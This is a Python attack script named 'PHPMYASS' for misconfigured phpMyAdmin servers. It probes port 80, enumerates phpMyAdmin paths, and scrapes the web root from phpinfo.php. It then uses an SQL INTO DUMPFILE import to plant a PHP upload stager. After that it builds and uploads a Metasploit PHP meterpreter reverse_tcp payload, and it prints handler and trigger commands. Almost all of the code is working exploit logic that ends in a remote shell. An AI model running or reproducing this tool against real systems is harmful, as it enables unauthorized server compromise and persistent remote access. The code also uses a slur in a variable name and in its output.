#!/usr/bin/python
###################################################################################################
#
#       _/_/_/_/_/    _/  _/_/_/  _/     _/ _/    _/ _/_/_/_/ _/_/_/_/ _/_/_/_/
#      _/   _/ _/    _/  _/   _/ _/_/ _/_/  _/ _/  _/     _/  _/       _/
#     _/_/_/  _/_/_/_/  _/_/_/  _/  _/ _/   _/    _/_/_/ _/    _/_/     _/_/
#    _/      _/     /  _/      _/     _/   _/    _/     _/        _/       _/
#   _/      _/    _/  _/      _/     _/   _/    _/     _/ _/_/_/_/ _/_/_/_/
#
# v0.53 WIP
# PHPMYASS | A LESSON IN SERVER MISCONFIGURATION | FIZZLE STICK (Professor)
# TESTED AGAINST: WINDOWS W/ UWAMP, XAMPP
# workFLOW: discover, inject, validate, report.....
# "what does this do?"....
# - this is designed to leverage misconfigured phpmyadmin installations with auth=config.
# - the process is agnostic, and can have sexy time with both windows or linux in theory.
# - We look for the open page, find some crap we need, clean it up, and then create an PHP shell.
# - New shell work has been added including PHP meterpreter & b347k webshell deliveries
###################################################################################################

# BING IN OUR LIBS
import sys
import os
import urllib
import mechanize
import logging
from re import findall

# BRING IN SCAPY, QUIET IT DOWN
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0

# TOR (still experimental)
#import socks
#import socket

# CREATE OUR BROWSER
br = mechanize.Browser()

# list taken from websploit2.0.4 
mylist = [
'/phpmyadmin/',
'/phpMyAdmin/',
'/phpmyadmin/',
'/PMA/',
'/admin/',
'/dbadmin/',
'/mysql/',
'/myadmin/',
'/phpmyadmin2/',
'/phpMyAdmin2/',
'/phpMyAdmin-2/',
'/php-my-admin/',
'/phpMyAdmin-2.2.3/',
'/phpMyAdmin-2.2.6/',
'/phpMyAdmin-2.5.1/',
'/phpMyAdmin-2.5.4/',
'/phpMyAdmin-2.5.5-rc1/',
'/phpMyAdmin-2.5.5-rc2/',
'/phpMyAdmin-2.5.5/',
'/phpMyAdmin-2.5.5-pl1/',
'/phpMyAdmin-2.5.6-rc1/',
'/phpMyAdmin-2.5.6-rc2/',
'/phpMyAdmin-2.5.6/',
'/phpMyAdmin-2.5.7/',
'/phpMyAdmin-2.5.7-pl1/',
'/phpMyAdmin-2.6.0-alpha/',
'/phpMyAdmin-2.6.0-alpha2/',
'/phpMyAdmin-2.6.0-beta1/',
'/phpMyAdmin-2.6.0-beta2/',
'/phpMyAdmin-2.6.0-rc1/',
'/phpMyAdmin-2.6.0-rc2/',
'/phpMyAdmin-2.6.0-rc3/',
'/phpMyAdmin-2.6.0/',
'/phpMyAdmin-2.6.0-pl1/',
'/phpMyAdmin-2.6.0-pl2/',
'/phpMyAdmin-2.6.0-pl3/',
'/phpMyAdmin-2.6.1-rc1/',
'/phpMyAdmin-2.6.1-rc2/',
'/phpMyAdmin-2.6.1/',
'/phpMyAdmin-2.6.1-pl1/',
'/phpMyAdmin-2.6.1-pl2/',
'/phpMyAdmin-2.6.1-pl3/',
'/phpMyAdmin-2.6.2-rc1/',
'/phpMyAdmin-2.6.2-beta1/',
'/phpMyAdmin-2.6.2-rc1/',
'/phpMyAdmin-2.6.2/',
'/phpMyAdmin-2.6.2-pl1/',
'/phpMyAdmin-2.6.3/',
'/phpMyAdmin-2.6.3-rc1/',
'/phpMyAdmin-2.6.3/',
'/phpMyAdmin-2.6.3-pl1/',
'/phpMyAdmin-2.6.4-rc1/',
'/phpMyAdmin-2.6.4-pl1/',
'/phpMyAdmin-2.6.4-pl2/',
'/phpMyAdmin-2.6.4-pl3/',
'/phpMyAdmin-2.6.4-pl4/',
'/phpMyAdmin-2.6.4/',
'/phpMyAdmin-2.7.0-beta1/',
'/phpMyAdmin-2.7.0-rc1/',
'/phpMyAdmin-2.7.0-pl1/',
'/phpMyAdmin-2.7.0-pl2/',
'/phpMyAdmin-2.7.0/',
'/phpMyAdmin-2.8.0-beta1/',
'/phpMyAdmin-2.8.0-rc1/',
'/phpMyAdmin-2.8.0-rc2/',
'/phpMyAdmin-2.8.0/',
'/phpMyAdmin-2.8.0.1/',
'/phpMyAdmin-2.8.0.2/',
'/phpMyAdmin-2.8.0.3/',
'/phpMyAdmin-2.8.0.4/',
'/phpMyAdmin-2.8.1-rc1/',
'/phpMyAdmin-2.8.1/',
'/phpMyAdmin-2.8.2/',
'/sqlmanager/',
'/mysqlmanager/',
'/p/m/a/',
'/PMA2005/',
'/pma2005/',
'/phpmanager/',
'/php-myadmin/',
'/phpmy-admin/',
'/webadmin/',
'/sqlweb/',
'/websql/',
'/webdb/',
'/mysqladmin/',
'/mysql-admin/']

# DEFINE OUR PHPINFO.PHP TARGETS
mylist2 = [
'/phpinfo.php',
'/xampp/phpinfo.php',
'/somedir/phpinfo.php',
'/scripts/phpinfo.php',
'/cgi-local/phpinfo.php',
'/phpinfo/phpinfo.php',
'/admin/phpinfo.php',
'/phpfiles/phpinfo.php',
'/data/phpinfo.php',
'/php/phpinfo.php',
'/tools/phpinfo.php',
'/info/install/phpinfo.php',
'/webadmin/phpinfo.php',
'/setup/phpinfo.php']

# DEFINE FUNCTION PROBE
def probe(host):
    myprobe = (IP(dst=host)/TCP(dport=80,flags="S"))
    try:
        derp = sr1(myprobe, timeout=1)
        derpy = derp.summary()
        if derpy.find('SA') != -1:
            print "[PORT80S:]\t\t[RESULT:] GOT SYN ACK\t\t\t\t[DECISION:] CONTINUE"
        elif derpy.find('RA') != -1:
            print "[PORT80S:]\t\t[RESULT:] CLOSED GOT RST/ACK\t\t[DECISION:] EXITING"
            sys.exit()
    except Exception, ack:
        print '[HARDEXIT:]\tNO TCP RESPONSE (Firewall/filtered/etc)'
        sys.exit()

# DEFINE CHECKROOT FUNCTION
def checkroot(host):
    funfun = ''
    for pmadir in mylist:
        try:
            openmya = br.open('http://'+host+pmadir+'main.php') # MAIN was required on windows to n
            #openmya = br.open('http://'+host+pmadir')
            funfun = 'yes'
            print '[PMADIRS:]\t\t[RESULT:] AWESOME! FOUND IT\t\t\t[DECISION:] CONTINUE'
            global thatdir
            thatdir = pmadir
            disc1 = openmya.read()
            if disc1.find('root@localhost') != -1:
                print "[OPNROOT:]\t\t[RESULT:] FOUND!!! root@localhost\t[DECISION:] CONTINUE"
                break
            else:
                print "[OPNROOT:]\t\t[RESULT:] open ROOT not found....\t\t[DECISION:] EXITING"
                break
        except:
            continue
    if funfun != 'yes':
        print '[HARDEXIT:]\t\t[RESULT:] Found NO PMA dirs ;(\t\t[DECISION:] EXITING'
        sys.exit()

# DEFINE WWWFIND FUNCTION
def wwwfind(host):
    funfun2 = ''
    for liner in mylist2:
        try:
            nfosearch = br.open('http://'+host+liner)
            if nfosearch.code == 200:
                phpresp= nfosearch.read()
                print '[PHPNFOS:]\t\t[RESULT:] FOUND PHPINFO.PHP! \t\t[DECISION:] CONTINUE'
                phpresp.count('DOCUMENT_ROOT')
                somedata = findall('DOCUMENT_ROOT +[\D]+[</td><td class="v">]', phpresp)
                nig = str(somedata)
                #len(nig)
                frack = nig.replace('[\'DOCUMENT_ROOT </td><td class="v">', '')
                nerd = str.split(frack)
                wwwdir = nerd[0]
                print '[W3BROOT:]\t\t[RESULT:] FOUND the file root!!\t\t[DECISION:] CONTINUE'
                #### BRING IN THE PAYLOAD
                payload1 = 'CREATE TABLE `phpmyadmin`.`newnew` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ; INSERT INTO newnew VALUES ("<?php echo \'<form enctype=multipart/form-data action=phpmyass911.php method=POST> <input type=hidden name=MAX_FILE_SIZE value=100000 /> <input name=uploadedfile type=file /><br /><input type=submit value=Upload File /></form>\'; move_uploaded_file($_FILES[uploadedfile][tmp_name], basename( $_FILES[uploadedfile][name]));?> ");select * into dumpfile \''+wwwdir+'/phpmyass911.php\' from newnew;'
                paywrite = open("newnew.sql", "w")
                paywrite.write(payload1)
                paywrite.close()
                print '[PAYLOAD:]\t\t[RESULT:] CREATED w/payload #1\t\t[DECISION:] CONTINUE'
                funfun2 = 'yes'
                break #breakout
        except:
            continue
    if funfun2 != 'yes':
        print '[HARDEXIT:]\t\t[RESULT:] ..not found....\t\t\t[DECISION:] EXITING'
        sys.exit()

# DEFINE SHELLDROP FUNCTION
def shelldrop(host):
    try:
        openmya2 = br.open('http://'+host+thatdir+'db_import.php?db=phpmyadmin')
        if openmya2.code == 200:
            print '[IMPORTS:]\t\t[RESULT:] FOUND IMPORT LINK!!\t\t[DECISION:] CONTINUE'
            importresp = openmya2.read()
            br.select_form(nr=1)
            filename = 'newnew.sql'
            br.form.add_file(open(filename), 'text/plain', filename)
            #br.form.set_all_readonly(False)
            br.submit()
            print "[PAYLOAD:]\t\t....SENT!!!!!!!"
            upurl = ('http://'+host+'/phpmyass911.php')
            upchuck = urllib.urlopen(upurl)
            try:
                if upchuck.code == 200:
                    print '[RESULTS:]\t\tOUR UPLOAD STAGER IS IN PLACE!!! '
                else:
                    print '[RESULTS:]\t\tUPLOAD STAGER FAILED!!! ;( SAD FACE!!!'
            except:
                pass
    except:
        pass

# DEFINE MSFPHP FUNCTION (needs stability)
def msfphp():
    msfhost = raw_input('[MSFPHP..:]\t\tLHOST?? >> ')
    msfport = raw_input('[MSFPHP..:]\t\tLPORT?? >> ')
    os.system('rm -rf phpmyass187.php') #generic pre-clean
    os.system('msfpayload php/meterpreter/reverse_tcp lhost='+msfhost+' lport='+msfport+' R > phpmyass187.php')
    ### msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost=192.168.1.119 lport=9999 E
    print '[MSFPHP..:]\t\tPHP METERPRETER created....'

# DEFINE MSFDELIVER FUNCTION (needs stability)
def msfdeliver():
    uploadpage = br.open('http://'+host+'/phpmyass911.php')
    br.select_form(nr=0)
    br.form.add_file(open('phpmyass187.php'), 'text/plain', 'phpmyass187.php')
    br.submit()
    print '[MSFPHP..:]\t\tPHP METERPRETER uploaded...'

# DEFINE BEAKDELIVER FUNCTION (needs stability)
def beakdeliver():
    uploadpage = br.open('http://'+host+'/phpmyass911.php')
    br.select_form(nr=0)
    br.form.add_file(open('beak.php'), 'text/plain', 'beak.php')
    br.submit()
    print '[MSFPHP..:]\t\tBEAK WEB SHELL uploaded...'

## THE MAGIC....
print '==============================================================================='
print '    _/_/_/_/_/    _/  _/_/_/  _/     _/ _/    _/ _/_/_/_/ _/_/_/_/ _/_/_/_/'
print '   _/    _/ _/   _/  _/    _/_/_/ _/_/  _/ _/  _/     _/  _/       _/'
print '  _/_/_/  _/_/_/_/  _/_/_/  _/  _/ _/   _/    _/_/_/ _/    _/_/     _/_/'
print ' _/      _/    _/  _/      _/     _/   _/    _/     _/        _/       _/'
print '_/      _/    _/  _/      _/     _/   _/    _/     _/ _/_/_/_/ _/_/_/_/ v0.53 WIP'
print '==============================================================================='
host = raw_input('[TARGET>>] ')
print '[*] GOING FULL RETARD WIP MODE ;D '
probe(host)
checkroot(host)
wwwfind(host)
shelldrop(host)
msfphp()
msfdeliver()
#beakdeliver()
print "NOW OPEN MSF copy and paste this line >> msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost=192.168.1.119 lport=9999 E << "
print 'FINAL INSTRUCTION OPEN THIS URL TO KICK THE SHELL>> http://192.168.1.122/phpmyass187.php'
print '==============================================================================='
exit

